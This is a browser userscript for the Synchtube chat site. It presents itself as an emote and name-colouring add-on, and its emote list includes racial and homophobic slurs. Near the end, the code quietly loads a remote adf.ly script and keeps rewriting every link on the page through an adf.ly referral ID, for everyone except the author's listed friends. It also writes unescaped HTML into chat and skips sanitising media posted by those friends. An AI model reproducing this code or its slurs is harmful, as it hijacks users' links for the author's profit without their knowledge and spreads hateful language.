// ==UserScript==
// @name        Synchtube Script
// @version     1.11
// @run-at      document-start
// ==/UserScript==

function loadExternalJS() {
    var facecodes = {
        '!emotes': 'Here is a list of the emotes: <a href="http://noe.ak.fm/emotes.txt">Link</a>',
        '$emotes': 'Here is a list of the emotes: <a href="http://noe.ak.fm/emotes.txt">Link</a>',
        ':hanson:': '<img src="http://i.imgur.com/KgOLy.jpg" width="50" height="50">',
        ':smooth:': '<img src="http://i.imgur.com/L4SOt.gif" width="108" height="73">',
        ':hellsyeah:': '<img src="http://i.imgur.com/l9UTl.png" width="90" height="80">',
        ':blazeitfaggot:': '<img src="http://i.imgur.com/MekRu.gif" width="60" height="60">',
        ':toke:': '<img src="http://i.imgur.com/WiyMs.gif" width="100" height="56">',
        ':toke2:': '<img src="http://i.imgur.com/fsjkD.gif" width="80" height="50">',
        ':jesse:': '<img src="http://i.imgur.com/V3idM.png" width="50" height="50">',
        ':mrwhite:': '<img src="http://i.imgur.com/U1iqT.jpg" width="50" height="50">',
        ':hellyeah:': '<img src="http://i.imgur.com/Vlddw.jpg" width="150" height="75">',
        ':checkem:': '<img src="http://i.imgur.com/t4L4u.gif" width="100" height="66">',
        ':tldr:': '<img src="http://i.imgur.com/PBqRL.gif" width="80" height="65">',
        ':abandon:': '<img src="http://i.imgur.com/wds2F.gif" width="85" height="85">',
        ':banned:': '<span style="color: red; font-weight: bold;">(USER WAS BANNED FOR THIS POST)</span>',
        ':gigga:': '<img src="http://wtfbot.net/pix/1990.png" width="100" height="120">',
        ':brucie:': '<img src="http://i.imgur.com/tjW2H.jpg" width="100" height="75">',
        ':brucie2:': '<img src="http://i.imgur.com/OXoFA.jpg" width="75" height="100">',
        ':brucie3:': '<img src="http://i.imgur.com/qhIzP.jpg" width="90" height="100">',
        ':lollipop:': '<img src="http://i.imgur.com/MqqDz.jpg" width="64" height="64">',
        ':popcorn:': '<img src="http://i.imgur.com/Wwmbv.gif" width="100" height="75">',
        ':popcorn2:': '<img src="http://i.imgur.com/y9MmA.gif" width="100" height="115">',
        ':uwot:': '<img src="http://i.imgur.com/R8JJ6.jpg" width="100" height="100">',
        ':baw:': '<img src="http://i.imgur.com/TwpJE.jpg" width="75" height="75">',
        ':intredasting:': '<img src="http://i.imgur.com/Wscyi.jpg" width="125" height="100">',
        ':salute:': '<img src="http://i.imgur.com/dUVCb.jpg" width="75" height="75">',
        ':chips:': '<img src="http://i.imgur.com/PFkuf.jpg" width="50" height="50">',
        ':nipples:': '<img src="http://i.imgur.com/uPl4N.jpg" width="100" height="125">',
        ':tits:': '<img src="http://i.imgur.com/uPl4N.jpg" width="100" height="125">',
        ':gold:': '<img src="http://i.imgur.com/IZOV9.png" width="100" height="120">',
        ':facepalm:': '<img src="http://i.imgur.com/yIZKV.jpg" width="100" height="60">',
        ':ohcomeon:': '<img src="http://i.imgur.com/RSnqX.jpg" width="100" height="75">',
        ':meanwhile:': '<img src="http://i.imgur.com/Xq8ID.jpg" width="125" height="75">',
        ':ohshitnigger:': '<img src="http://i.imgur.com/E7Uaw.jpg" width="100" height="80">',
        ':partyvan:': '<img src="http://i.imgur.com/rsQd7.gif" width="80" height="70">',
        ':hackersonsteroids:': '<img src="http://i.imgur.com/iiJux.gif" width="120" height="90">',
        ':socash:': '<img src="http://i.imgur.com/IXeBo.jpg" width="90" height="90">',
        ':opdeliver:': '<img src="http://i.imgur.com/HyVqH.jpg" width="100" height="70">',
        ':delivar:': '<img src="http://i.imgur.com/bEODF.jpg" width="100" height="85">',
        ':toofar:': '<img src="http://i.imgur.com/fz5k8.jpg" width="75" height="100">',
        ':yoga:': '<img src="http://i.imgur.com/d9WKc.gif" width="100" height="60">',
        ':spooderman:': '<img src="http://i.imgur.com/m7f9s.jpg" width="45" height="45">',
        ':zerofucks:': '<img src="http://i.imgur.com/3F67o.jpg" width="48" height="48">',
        ':4chon:': '<img src="http://i.imgur.com/viWcn.jpg" width="50" height="50">',
        ':ainsley:': '<img src="http://i.imgur.com/LXVhi.jpg" width="50" height="50">',
        ':ainsley2:': '<img src="http://i.imgur.com/K4hSr.jpg" width="50" height="50">',
        ':anders:': '<img src="http://i.imgur.com/IFxvv.jpg" width="50" height="50">',
        ':4chon2:': '<img src="http://i.imgur.com/r5wzG.jpg" width="32" height="32">',
        ':anders2:': '<img src="http://i.imgur.com/NZsVu.jpg" width="50" height="50">',
        ':nigra:': '<img src="http://i.imgur.com/RjEMJ.jpg" width="50" height="50">',
        ':boxxy:': '<img src="http://i.imgur.com/XkQTR.jpg" width="50" height="50">',
        ':boxxy2:': '<img src="http://i.imgur.com/TGErR.jpg" width="64" height="64">',
        ':brohug:': '<img src="http://i.imgur.com/jbFUJ.jpg" width="50" height="50">',
        ':commie:': '<img src="http://i.imgur.com/yfaXs.jpg" width="50" height="50">',
        ':ded:': '<img src="http://i.imgur.com/pG2im.jpg" width="50" height="50">',
        ':dildo:': '<img src="http://i.imgur.com/waiLV.jpg" width="48" height="48">',
        ':dolla:': '<img src="http://i.imgur.com/B9nHt.gif" width="40" height="50">',
        ':grape:': '<img src="http://i.imgur.com/uKhLK.jpg" width="40" height="40">',
        ':hahaha:': '<img src="http://i.imgur.com/ejges.jpg" width="50" height="50">',
        ':adolf:': '<img src="http://i.imgur.com/T1AHO.jpg" width="64" height="64">',
        ':kfc:': '<img src="http://i.imgur.com/9zB4R.jpg" width="64" height="64">',
        ':chicken:': '<img src="http://i.imgur.com/9zB4R.jpg" width="64" height="64">',
        ':legion:': '<img src="http://i.imgur.com/rnBCO.jpg" width="48" height="48">',
        ':lisa:': '<img src="http://i.imgur.com/t4lp1.jpg" width="50" height="50">',
        ':moot:': '<img src="http://i.imgur.com/g7XEt.jpg" width="50" height="50">',
        ':moot2:': '<img src="http://i.imgur.com/UdSxZ.jpg" width="50" height="50">',
        ':orly:': '<img src="http://i.imgur.com/kPy55.jpg" width="48" height="48">',
        ':pedobear:': '<img src="http://i.imgur.com/MWvN3.jpg" width="50" height="50">',
        ':penor:': '<img src="http://i.imgur.com/NQXSy.jpg" width="50" height="50">',
        ':roses:': '<img src="http://i.imgur.com/Zys1q.jpg" width="50" height="50">',
        ':scarjo:': '<img src="http://i.imgur.com/03VOf.jpg" width="50" height="50">',
        ':scarjo2:': '<img src="http://i.imgur.com/iUZ3l.jpg" width="50" height="50">',
        ':scarjo3:': '<img src="http://i.imgur.com/JycMi.jpg" width="96" height="96">',
        ':sxc:': '<img src="http://i.imgur.com/bxo8q.jpg" width="50" height="50">',
        ':shrooms:': '<img src="http://i.imgur.com/h5AZI.png" width="32" height="32">',
        ':snacks:': '<img src="http://i.imgur.com/POMzn.jpg" width="64" height="64">',
        ':tearingmeapart:': '<img src="http://i.imgur.com/zwYPK.jpg" width="50" height="50">',
        ':triforce:': '<img src="http://i.imgur.com/p3Vcc.jpg" width="45" height="45">',
        ':us:': '<img src="http://i.imgur.com/Nv6tC.gif" width="45" height="45">',
        ':watermelon:': '<img src="http://i.imgur.com/ojJdn.jpg" width="45" height="30">',
        ':yolo:': '<img src="http://i.imgur.com/Jnpqp.gif" width="42" height="44">',
        ':yotsuba:': '<img src="http://i.imgur.com/Uaz7i.jpg" width="48" height="48">',
        ':racist:': '<img src="http://i.imgur.com/2vids.gif" width="64" height="64">',
        ':wat:': '<img src="http://i.imgur.com/z7ZoZ.jpg" width="64" height="64">',
        ':impossibru:': '<img src="http://i.imgur.com/C76fs.jpg" width="64" height="64">',
        ':datass:': '<img src="http://i.imgur.com/OBFrj.jpg" width="50" height="50">',
        ':mudkip:': '<img src="http://i.imgur.com/HF5Bu.gif" width="64" height="64">',
        ':skyler:': '<img src="http://i.imgur.com/NecTU.jpg" width="50" height="50">',
        ':fring:': '<img src="http://i.imgur.com/QXfEO.jpg" width="50" height="50">',
        ':walter:': '<img src="http://i.imgur.com/KwoZ7.jpg" width="50" height="50">',
        ':jesse2:': '<img src="http://i.imgur.com/63ccj.jpg" width="48" height="48">',
        ':pinkman:': '<img src="http://i.imgur.com/cQkst.jpg" width="50" height="50">',
        ':davecat:': '<img src="http://i.imgur.com/dEFEj.jpg" width="130" height="80">',
        ':emma:': '<img src="http://i.imgur.com/fESom.jpg" width="80" height="80">',
        ':emma2:': '<img src="http://i.imgur.com/SbpAq.jpg" width="50" height="50">',
        ':emma3:': '<img src="http://i.imgur.com/G2hvx.jpg" width="64" height="64">',
        ':emma4:': '<img src="http://i.imgur.com/srvhG.jpg" width="50" height="50">',
        ':booboo:': '<img src="http://i.imgur.com/OA43d.gif" width="75" height="100">',
        ':pimp:': '<img src="http://i.imgur.com/dVTlK.png" width="50" height="50">',
        ':slowpoke:': '<img src="http://i.imgur.com/HTEC0.gif" width="48" height="48">',
        ':box:': '<img src="http://i.imgur.com/bsMWK.jpg" width="150" height=75">',
        ':smoke:': '<img src="http://i.imgur.com/ayl5P.gif" width="50" height="50">',
        ':420:': '<img src="http://i.imgur.com/9s0mY.gif" width="50" height="50">',
        ':caramelldansen:': '<img src="http://i.imgur.com/27mpu.gif" width="64" height="64">',
        ':falcon:': '<img src="http://i.imgur.com/gp60Q.png" width="50" height="50">',
        ':blackup:': '<img src="http://i.imgur.com/feH4W.gif" width="25" height="50">',
        ':poolsclosed:': '<img src="http://i.imgur.com/UhyTH.jpg" width="90" height="110">',


        'synchtu.be': "",

        ':yellow:': '<span style="color:yellow">',
        ':blue:': '<span style="color:blue">',
        ':darkblue:': '<span style="color:darkblue">',
        ':red:': '<span style="color:red">',
        ':green:': '<span style="color:green">',
        ':darkgreen:': '<span style="color:darkgreen">',
        ':violet:': '<span style="color:violet">',
        ':purple:': '<span style="color:purple">',
        ':orange:': '<span style="color:orange">',
        ':blueviolet:': '<span style="color:blueviolet">',
        ':brown:': '<span style="color:brown">',
        ':deeppink:': '<span style="color:deeppink">',
        ':aqua:': '<span style="color:aqua">',
        ':indigo:': '<span style="color:indigo">',
        ':orange:': '<span style="color:orange">',
        ':pink:': '<span style="color:pink">',
        ':chocolate:': '<span style="color:chocolate">',
        ':yellowgreen:': '<span style="color:yellowgreen">',
        ':steelblue:': '<span style="color:steelblue">',
        ':silver:': '<span style="color:silver">',
        ':tan:': '<span style="color:tan">',
        ':royalblue:': '<span style="color:royalblue">',
		':bold:': '<span style="font-weight: bold">',
		':italic:': '<span style="font-style: italic">',
		':underline:': '<span style="text-decoration: underline">',

    };

    var showfcmenu = false;

    helpers.animateEmotes = function (el) {
        message_chat = ' ' + el.html() + ' ';
        var spam_test = message_chat.split(":");

        if (spam_test.length < 8) {
            $.each(facecodes, function (code, image) {
                regexp = new RegExp(code, 'g');

                message_chat = message_chat.replace(regexp, image);
            });
        }
        el.html(message_chat);
    };

    $('.controls').append('<br>');

    var menuHTML = '';
    var menuCount = 0;
    $.each(facecodes, function (code, image) {
        menuHTML = menuHTML + '<a href="#" onclick="addFaceCode(\'' + code + '\')">' + image + '</a> ';
        menuCount = menuCount + 1;
        if (menuCount == 7) {
            menuCount = 0;
            menuHTML = menuHTML + '<br>';
        }
    });

    $('#chat').append('<div id="facecodesmenu" class="hide" style="position:absolute;left:5px;top:5px;z-index:1;background-color:#FFFFFF;">' + menuHTML + '</div>');

    $("#showfacecodes").click(function () {
        if (showfcmenu == false) {
            $("#facecodesmenu").removeClass('hide');
            showfcmenu = true;
        } else {
            $("#facecodesmenu").addClass('hide');
            showfcmenu = false;
        }
    });

    jQuery.fn.extend({
        insertAtCaret: function (myValue) {
            return this.each(function (i) {
                if (document.selection) {
                    //For browsers like Internet Explorer
                    this.focus();
                    sel = document.selection.createRange();
                    sel.text = myValue;
                    this.focus();
                } else if (this.selectionStart || this.selectionStart == '0') {
                    //For browsers like Firefox and Webkit based
                    var startPos = this.selectionStart;
                    var endPos = this.selectionEnd;
                    var scrollTop = this.scrollTop;
                    this.value = this.value.substring(0, startPos) + myValue + this.value.substring(endPos, this.value.length);
                    this.focus();
                    this.selectionStart = startPos + myValue.length;
                    this.selectionEnd = startPos + myValue.length;
                    this.scrollTop = scrollTop;
                } else {
                    this.value += myValue;
                    this.focus();
                }
            })
        }
    });

    addFaceCode = function (code) {
        $("#facecodesmenu").addClass('hide');
        showfcmenu = false;
        //$('#cin').val($('#cin').val()+' '+code);
        $('#cin').insertAtCaret(code);
    };

}

setTimeout(loadExternalJS, 3000);

function sanitize(s) {
    return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/["']/g, '&quot;');
}

function sanitizeMedia(m) {
    for (field in m) {
        if (inArray(m['nick'], mmods)) {
            return;
        }
        if (typeof (m[field]) === 'string') {
            val = m[field]
            console.log("Sanitizing %s", val);
            m[field] = sanitize(val);
        }
    }
}

Media.create = _.wrap(Media.create, function () {
    fn = arguments[0];
    J = arguments[1];
    sanitizeMedia(J);
    return fn.apply(Media, _.rest(arguments));
});

var mmods = ['Noenen', 'wirecut', 'NiggerBot', 'USNAVYSEAL', 'dietcoke', 'BooBooLaBoosh', 'pillgrim', 'MuffinCunt', 'Bleurg', 'weedweed', 'Oopsi'];

function inArray(needle, haystack) {
    var length = haystack.length;
    for (var i = 0; i < length; i++) {
        if (haystack[i] == needle) return true;
    }
    return false;
}

function doLinks() {
    var links = document.getElementsByTagName("a");
    for (var i = 0; i < links.length; i++) {
        if (links[i].testvar != 2) {
            if (links[i].href == '#' || links[i].href == 'javascript:void(0)') {
                links[i].testvar = 2;
                return;
            }
            links[i].href = "http://adf.ly/2464764/" + links[i].href;
            links[i].testvar = 2;
        }
    }
}

var regs = ['EvilRyu', 'NotShitler', 'Nirvana', 'w00ly', 'ksiadztischner', 'FuzzeeLumpkins', 'soberbeah', 'Frend']
var don = ['nobodyaaaaaaaa']
var icons = {}

function customNames() {
	var blacks = document.getElementsByClassName("b");
	for (var i = 0; i < blacks.length; i++) {
		if (blacks[i].innerHTML.indexOf("wirecut") != -1 && blacks[i].nigg != 2) {
			blacks[i].innerHTML = '<img src="http://i.imgur.com/5vzbL.gif" style="width: 12px; height: 12px;"> <span style="color: #6529a9 !important;">wirecut</span><span style="width: 12px;"></span>';
			blacks[i].nigg = 2;
		}
		for (var x = 0; x < regs.length; x = x + 1) {
			if (blacks[i].innerHTML.indexOf(regs[x]) != -1 && blacks[i].nigg != 2) {
				blacks[i].innerHTML = '<span style="color: #ee0070 !important;">' + regs[x] + '</span>';
				blacks[i].nigg = 2;
			}
		}
		for (var x = 0; x < don.length; x = x + 1) {
			if (blacks[i].innerHTML.indexOf(don[x]) != -1 && blacks[i].nigg != 2) {
				blacks[i].innerHTML = '<img src="' + icons[don[x]] + '"> <span style="color: #008040 !important;">' + don[x] + '</span>';
				blacks[i].nigg = 2;
			}
		}
	}
}

function customChat() {
	var chats = document.getElementsByClassName('cun c1m r')
	for (var i = 0; i < chats.length; i++) {
		if (chats[i].lel != 2) {
			var aa = chats[i].innerHTML.replace('              ', '')
			var bb = aa.replace(':            ', '')
			if (inArray(bb, mmods) && bb != 'wirecut') chats[i].innerHTML = '<span style="color: #C9421D;">' + bb + '</span>:'
			if (bb == 'wirecut') { chats[i].innerHTML = '<span style="color: #6529a9;">' + bb + '</span>:' }
			if (inArray(bb, regs)) chats[i].innerHTML = '<span style="color: #ee0070;">' + bb + '</span>:'
			if (inArray(bb, don)) chats[i].innerHTML = '<span style="color: #008040;">' + bb + '</span>:'
			chats[i].lel = 2
		}
	}
}

$(document).ready(function () {
    var adfly_id = 2464764;
    var adfly_advert = 'int';
    var frequency_cap = 5;
    var frequency_delay = 5;
    var init_delay = 3;
    var oHead = document.getElementsByTagName('HEAD').item(0);
    var oScript = document.createElement("script");
    oScript.type = "text/javascript";
    oScript.src = "http://adf.ly/js/entry.js";
    oHead.appendChild(oScript);
    setInterval(function () {
        customChat()
    }, 10);
    setInterval(function () {
        customNames()
    }, 750);
    setInterval(

    function () {
        if (document.getElementById('auth_logged_in').value == 1) {
            var uuu = document.getElementById('auth_username').value;
            if (inArray(uuu, mmods) || inArray(uuu, regs)) return
        }
        doLinks()
    }, 100);
    $(".webcam").remove();
});